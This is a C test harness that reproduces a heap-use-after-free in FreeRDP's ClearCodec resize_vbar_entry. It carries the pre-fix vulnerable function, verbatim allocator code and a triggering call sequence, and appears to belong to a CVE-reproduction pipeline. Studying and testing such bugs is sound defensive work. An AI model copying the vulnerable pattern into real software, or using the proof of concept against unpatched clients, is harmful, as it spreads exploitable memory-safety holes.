/* cve_barebone direct-call harness for cve_f68a32f7 (freerdp)
 * Target: resize_vbar_entry  (libfreerdp/codec/clear.c, ClearCodec VBAR-cache resize)
 * Bug class: heap-use-after-free READ (CWE-416), reachable purely by calling
 *   resize_vbar_entry() with attacker-controlled CLEAR_VBAR_ENTRY/CLEAR_CONTEXT fields.
 *
 * fix_commit dc7fdb165095139be779a4000199bc1706b06ad5 moves the line
 *     vBarEntry->size = vBarEntry->count;
 * from BEFORE the winpr_aligned_recalloc() call to AFTER it succeeds. Before the fix:
 *   1. resize_vbar_entry() bumps vBarEntry->size to the NEW (larger) count
 *      UNCONDITIONALLY, before attempting the resize.
 *   2. winpr_aligned_recalloc(vBarEntry->pixels, count, bpp, 32) calls
 *      winpr_aligned_offset_recalloc() -- which, on ANY failure path (including the
 *      plain `num==0 || size==0` early-out), unconditionally FREES the OLD memblock
 *      via `winpr_aligned_free(memblock)` at its shared `fail:` label BEFORE
 *      returning NULL. This is real, verbatim behavior of winpr_aligned_offset_
 *      recalloc() (winpr/libwinpr/crt/alignment.c), included below unmodified.
 *   3. On that NULL return, resize_vbar_entry() returns FALSE WITHOUT touching
 *      vBarEntry->pixels (the `vBarEntry->pixels = tmp;` assignment only executes on
 *      the success path) -- so vBarEntry->pixels is left pointing at memory that was
 *      JUST FREED in step 2, while vBarEntry->size (step 1) already claims the new,
 *      larger capacity. vBarEntry is a persistent, cached CLEAR_CONTEXT VBarStorage[]
 *      slot in the real decoder, so a LATER call sees this corrupted
 *      {size=large, pixels=dangling} pair.
 *   4. A subsequent resize_vbar_entry() call with count > (the now-inflated) size
 *      re-enters the resize block and calls winpr_aligned_recalloc() again, this time
 *      on the DANGLING vBarEntry->pixels. winpr_aligned_offset_recalloc()'s very first
 *      move on a non-NULL memblock is WINPR_ALIGNED_MEM_STRUCT_FROM_PTR(memblock) ->
 *      `pMem->sig` -- a raw READ through the freed pointer. Heap-use-after-free.
 *
 * This harness reproduces steps 1-4 with THREE direct, in-isolation calls to
 * resize_vbar_entry() (no other project code involved, no manual free() of pixels by
 * the harness itself -- the dangling pointer is produced ORGANICALLY by the same bug
 * the fix commit targets):
 *   Call A (count 0->n1, valid bpp)   : establishes a real winpr-aligned pixels buffer.
 *   Call B (count n1->n2, bpp FORCED TO 0 via clear->format=0): reproduces steps 1-3 --
 *     winpr_aligned_recalloc's real `size==0` branch frees the Call-A buffer and
 *     returns NULL; resize_vbar_entry bumps size to n2 and returns FALSE with pixels
 *     left dangling.
 *   Call C (count n2->n3, valid bpp)  : reproduces step 4 -- the UAF read fires inside
 *     winpr_aligned_offset_recalloc(), called directly from resize_vbar_entry's own
 *     `winpr_aligned_recalloc(vBarEntry->pixels, ...)` statement.
 *
 * clear->format bits [24:29] are the raw bitsPerPixel field read by the verbatim
 * FreeRDPGetBitsPerPixel()/FreeRDPGetBytesPerPixel() below (color.h) -- format=0 is a
 * genuine (if degenerate) UINT32 value for that field, not a fabricated code path.
 *
 * winpr_aligned_offset_malloc/recalloc/free + the WINPR_ALIGNED_MEM bookkeeping struct
 * (winpr/libwinpr/crt/alignment.c) are copied VERBATIM below (real callees directly on
 * the crash path -- NOT incidental). CLEAR_CONTEXT/CLEAR_VBAR_ENTRY/CLEAR_GLYPH_ENTRY
 * and the CLEARCODEC_VBAR_* constants are copied VERBATIM from libfreerdp/codec/
 * clear.c so the struct layout resize_vbar_entry sees is the real one (only
 * ->format/->pixels/->size/->count are ever touched by it). WLog_ERR/TAG are
 * incidental (diagnostic logging only, never influence control flow or data) and
 * stubbed to a no-op macro, matching the harness rules.
 *
 * Build (dc_batch/dc_try, in cvf-builder):
 *   clang -fsanitize=address -fno-omit-frame-pointer -g -O1 harness.c -lm
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <inttypes.h>
#include <limits.h>

#define nullptr NULL
#define WINPR_RESTRICT restrict
#define WINPR_API
#define WINPR_ATTR_NODISCARD
#define FREERDP_API

/* winpr/include/winpr/wtypes.h -- real names/types (non-_WIN32 branch) */
typedef int32_t BOOL;
typedef uint8_t BYTE;
typedef uint32_t UINT32;
#ifndef TRUE
#define TRUE true
#endif
#ifndef FALSE
#define FALSE false
#endif

/* winpr/include/winpr/crt.h -- real macro names */
#define CopyMemory(Destination, Source, Length) memcpy((Destination), (Source), (Length))
#define ZeroMemory(Destination, Length) memset((Destination), 0, (Length))

/* Incidental: WLog_ERR/TAG are diagnostic-only on every path leading to our crash
 * (never influence control flow or data), stubbed to a no-op per the harness rules. */
#define TAG "com.freerdp.codec.clear"
#define WLog_ERR(tag, fmt, ...) ((void)0)

/* ================================================================================
 * winpr/libwinpr/crt/alignment.c -- VERBATIM (real callees directly on the crash path)
 * ================================================================================ */
#define WINPR_ALIGNED_MEM_SIGNATURE 0x0BA0BAB

#define WINPR_ALIGNED_MEM_STRUCT_FROM_PTR(_memptr) \
	(WINPR_ALIGNED_MEM*)(((size_t)(((BYTE*)(_memptr)) - sizeof(WINPR_ALIGNED_MEM))))

struct winpr_aligned_mem
{
	UINT32 sig;
	size_t size;
	void* base_addr;
};
typedef struct winpr_aligned_mem WINPR_ALIGNED_MEM;

/* prototypes (mirror winpr/include/winpr/crt.h -- needed here since the definitions
 * below keep the original file's mutually-referencing order) */
void* winpr_aligned_offset_malloc(size_t size, size_t alignment, size_t offset);
void* winpr_aligned_offset_recalloc(void* memblock, size_t num, size_t size, size_t alignment,
                                    size_t offset);
void* winpr_aligned_recalloc(void* memblock, size_t num, size_t size, size_t alignment);
void winpr_aligned_free(void* memblock);

void* winpr_aligned_recalloc(void* memblock, size_t num, size_t size, size_t alignment)
{
	return winpr_aligned_offset_recalloc(memblock, num, size, alignment, 0);
}

void* winpr_aligned_offset_malloc(size_t size, size_t alignment, size_t offset)
{
	size_t header = 0;
	size_t alignsize = 0;
	uintptr_t basesize = 0;
	void* base = nullptr;
	void* memblock = nullptr;
	WINPR_ALIGNED_MEM* pMem = nullptr;

	/* alignment must be a power of 2 */
	if (alignment % 2 == 1)
		return nullptr;

	/* offset must be less than size */
	if (offset >= size)
		return nullptr;

	/* minimum alignment is pointer size */
	if (alignment < sizeof(void*))
		alignment = sizeof(void*);

	if (alignment > SIZE_MAX - sizeof(WINPR_ALIGNED_MEM))
		return nullptr;

	header = sizeof(WINPR_ALIGNED_MEM) + alignment;

	if (size > SIZE_MAX - header)
		return nullptr;

	alignsize = size + header;
	/* malloc size + alignment to make sure we can align afterwards */
#if defined(_ISOC11_SOURCE)
	base = aligned_alloc(alignment, alignsize);
#elif defined(_POSIX_C_SOURCE) && (_POSIX_C_SOURCE >= 200112L) || (_XOPEN_SOURCE >= 600)
	if (posix_memalign(&base, alignment, alignsize) != 0)
		return nullptr;
#else
	base = malloc(alignsize);
#endif
	if (!base)
		return nullptr;

	basesize = (uintptr_t)base;

	if ((offset > UINTPTR_MAX) || (header > UINTPTR_MAX - offset) ||
	    (basesize > UINTPTR_MAX - header - offset))
	{
		free(base);
		return nullptr;
	}

	memblock = (void*)(((basesize + header + offset) & ~(alignment - 1)) - offset);
	pMem = WINPR_ALIGNED_MEM_STRUCT_FROM_PTR(memblock);
	pMem->sig = WINPR_ALIGNED_MEM_SIGNATURE;
	pMem->base_addr = base;
	pMem->size = size;
	return memblock;
}

WINPR_ATTR_NODISCARD static inline size_t cMIN(size_t a, size_t b)
{
	if (a > b)
		return b;
	return a;
}

void* winpr_aligned_offset_recalloc(void* memblock, size_t num, size_t size, size_t alignment,
                                    size_t offset)
{
	char* newMemblock = nullptr;
	WINPR_ALIGNED_MEM* pMem = nullptr;
	WINPR_ALIGNED_MEM* pNewMem = nullptr;

	if (!memblock)
	{
		newMemblock = winpr_aligned_offset_malloc(size * num, alignment, offset);

		if (newMemblock)
		{
			pNewMem = WINPR_ALIGNED_MEM_STRUCT_FROM_PTR(newMemblock);
			ZeroMemory(newMemblock, pNewMem->size);
		}

		return newMemblock;
	}

	pMem = WINPR_ALIGNED_MEM_STRUCT_FROM_PTR(memblock);

	if (pMem->sig != WINPR_ALIGNED_MEM_SIGNATURE)
	{
		WLog_ERR(TAG,
		         "_aligned_offset_recalloc: memory block was not allocated by _aligned_malloc!");
		goto fail;
	}

	if ((num == 0) || (size == 0))
		goto fail;

	if (pMem->size > (1ull * num * size) + alignment)
		return memblock;

	newMemblock = winpr_aligned_offset_malloc(size * num, alignment, offset);

	if (!newMemblock)
		goto fail;

	pNewMem = WINPR_ALIGNED_MEM_STRUCT_FROM_PTR(newMemblock);
	{
		const size_t csize = cMIN(pMem->size, pNewMem->size);
		memcpy(newMemblock, memblock, csize);
		ZeroMemory(newMemblock + csize, pNewMem->size - csize);
	}
fail:
	winpr_aligned_free(memblock);
	return newMemblock;
}

void winpr_aligned_free(void* memblock)
{
	WINPR_ALIGNED_MEM* pMem = nullptr;

	if (!memblock)
		return;

	pMem = WINPR_ALIGNED_MEM_STRUCT_FROM_PTR(memblock);

	if (pMem->sig != WINPR_ALIGNED_MEM_SIGNATURE)
	{
		WLog_ERR(TAG, "_aligned_free: memory block was not allocated by _aligned_malloc!");
		return;
	}

	free(pMem->base_addr);
}

/* ================================================================================
 * libfreerdp/codec/clear.c -- VERBATIM struct/typedef/macro excerpts
 * (the exact types resize_vbar_entry's signature and body need)
 * ================================================================================ */
typedef struct S_NSC_CONTEXT NSC_CONTEXT; /* include/freerdp/codec/nsc.h -- opaque,
                                            * never dereferenced by resize_vbar_entry */

#define CLEARCODEC_VBAR_SIZE 32768
#define CLEARCODEC_VBAR_SHORT_SIZE 16384

typedef struct
{
	UINT32 size;
	UINT32 count;
	UINT32* pixels;
} CLEAR_GLYPH_ENTRY;

typedef struct
{
	UINT32 size;
	UINT32 count;
	BYTE* pixels;
} CLEAR_VBAR_ENTRY;

struct S_CLEAR_CONTEXT
{
	BOOL Compressor;
	NSC_CONTEXT* nsc;
	UINT32 seqNumber;
	BYTE* TempBuffer;
	size_t TempSize;
	UINT32 nTempStep;
	UINT32 TempFormat;
	UINT32 format;
	CLEAR_GLYPH_ENTRY GlyphCache[4000];
	UINT32 VBarStorageCursor;
	CLEAR_VBAR_ENTRY VBarStorage[CLEARCODEC_VBAR_SIZE];
	UINT32 ShortVBarStorageCursor;
	CLEAR_VBAR_ENTRY ShortVBarStorage[CLEARCODEC_VBAR_SHORT_SIZE];
};
typedef struct S_CLEAR_CONTEXT CLEAR_CONTEXT;

/* ================================================================================
 * include/freerdp/codec/color.h -- VERBATIM (real callees resize_vbar_entry calls
 * directly: FreeRDPGetBytesPerPixel -> FreeRDPGetBitsPerPixel)
 * ================================================================================ */
static inline UINT32 FreeRDPGetBitsPerPixel(UINT32 format)
{
	return (((format) >> 24) & 0x3F);
}

static inline UINT32 FreeRDPGetBytesPerPixel(UINT32 format)
{
	return (FreeRDPGetBitsPerPixel(format) + 7) / 8;
}

/* ==== VERBATIM from data_cve/cve_f68a32f7/target/original_function.c ==== */
static BOOL resize_vbar_entry(CLEAR_CONTEXT* WINPR_RESTRICT clear,
                              CLEAR_VBAR_ENTRY* WINPR_RESTRICT vBarEntry)
{
	if (vBarEntry->count > vBarEntry->size)
	{
		const UINT32 bpp = FreeRDPGetBytesPerPixel(clear->format);
		const UINT32 oldPos = vBarEntry->size * bpp;
		const UINT32 diffSize = (vBarEntry->count - vBarEntry->size) * bpp;

		vBarEntry->size = vBarEntry->count;
		BYTE* tmp =
		    (BYTE*)winpr_aligned_recalloc(vBarEntry->pixels, vBarEntry->count, 1ull * bpp, 32);

		if (!tmp)
		{
			WLog_ERR(TAG, "vBarEntry->pixels winpr_aligned_recalloc %" PRIu32 " failed",
			         vBarEntry->count * bpp);
			return FALSE;
		}

		memset(&tmp[oldPos], 0, diffSize);
		vBarEntry->pixels = tmp;
	}

	if (!vBarEntry->pixels && vBarEntry->size)
	{
		WLog_ERR(TAG, "vBarEntry->pixels is nullptr but vBarEntry->size is %" PRIu32 "",
		         vBarEntry->size);
		return FALSE;
	}

	return TRUE;
}
/* ==== end verbatim ==== */

static uint32_t vb_rd_u32le(const unsigned char* p)
{
	return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

int main(int argc, char** argv)
{
	if (argc < 2)
		return 0;

	FILE* f = fopen(argv[1], "rb");
	if (!f)
		return 0;

	if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 0; }
	long fsz = ftell(f);
	if (fsz < 0) fsz = 0;
	if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 0; }

	size_t len = (size_t)fsz;
	unsigned char* data = NULL;
	if (len > 0)
	{
		/* HEAP-allocate the raw input, ASAN-guarded */
		data = (unsigned char*)malloc(len);
		if (!data) { fclose(f); return 0; }
		size_t rd = fread(data, 1, len, f);
		len = rd;
	}
	fclose(f);

	unsigned char mode = (len >= 1) ? (unsigned char)(data[0] & 1) : 0;
	uint32_t seed = (len >= 5) ? vb_rd_u32le(data + 1) : 0;
	free(data);

	uint32_t r0 = seed & 0xFF;
	uint32_t r1 = (seed >> 8) & 0xFF;
	uint32_t r2 = (seed >> 16) & 0xFF;

	/* small, monotonically growing counts -- keeps every allocation trivially small */
	UINT32 n1 = 1u + (r0 % 16u);
	UINT32 n2 = n1 + 1u + (r1 % 16u);
	UINT32 n3 = n2 + 1u + (r2 % 16u);

	/* clear->format bits [24:29] = bitsPerPixel (FreeRDPGetBitsPerPixel, verbatim
	 * above). 32 -> FreeRDPGetBytesPerPixel() == 4 (an ordinary 32bpp pixel buffer).
	 * 0  -> FreeRDPGetBytesPerPixel() == 0 (degenerate, drives winpr_aligned_
	 *       recalloc's real `size==0` early-fail branch -- see header comment step 2). */
	const UINT32 FORMAT_VALID_BPP4 = (32u << 24);
	const UINT32 FORMAT_ZERO_BPP = 0u;

	CLEAR_CONTEXT* clear = (CLEAR_CONTEXT*)calloc(1, sizeof(CLEAR_CONTEXT));
	CLEAR_VBAR_ENTRY* vBarEntry = (CLEAR_VBAR_ENTRY*)calloc(1, sizeof(CLEAR_VBAR_ENTRY));
	if (!clear || !vBarEntry)
	{
		free(clear);
		free(vBarEntry);
		return 0;
	}

	/* Call A: size 0 -> n1, valid bpp. Establishes a real winpr-aligned pixels buffer
	 * (the same call resize_vbar_entry itself makes on a fresh VBarStorage slot). */
	clear->format = FORMAT_VALID_BPP4;
	vBarEntry->count = n1;
	(void)resize_vbar_entry(clear, vBarEntry);

	/* Call B: size n1 -> n2. */
	if (mode == 1)
		clear->format = FORMAT_ZERO_BPP; /* TRIGGER: see header comment steps 1-3 */
	else
		clear->format = FORMAT_VALID_BPP4; /* SAFE: an ordinary second growth */
	vBarEntry->count = n2;
	(void)resize_vbar_entry(clear, vBarEntry);

	/* Call C: size n2 -> n3, valid bpp.
	 *   TRIGGER: vBarEntry->pixels is dangling (freed inside Call B's failed
	 *            winpr_aligned_recalloc) -> heap-use-after-free READ inside
	 *            winpr_aligned_offset_recalloc(), called directly from
	 *            resize_vbar_entry's own body.
	 *   SAFE:    Call B succeeded normally, so this is a third ordinary growth. */
	clear->format = FORMAT_VALID_BPP4;
	vBarEntry->count = n3;
	(void)resize_vbar_entry(clear, vBarEntry);

	if (vBarEntry->pixels)
		winpr_aligned_free(vBarEntry->pixels);
	free(clear);
	free(vBarEntry);
	return 0;
}
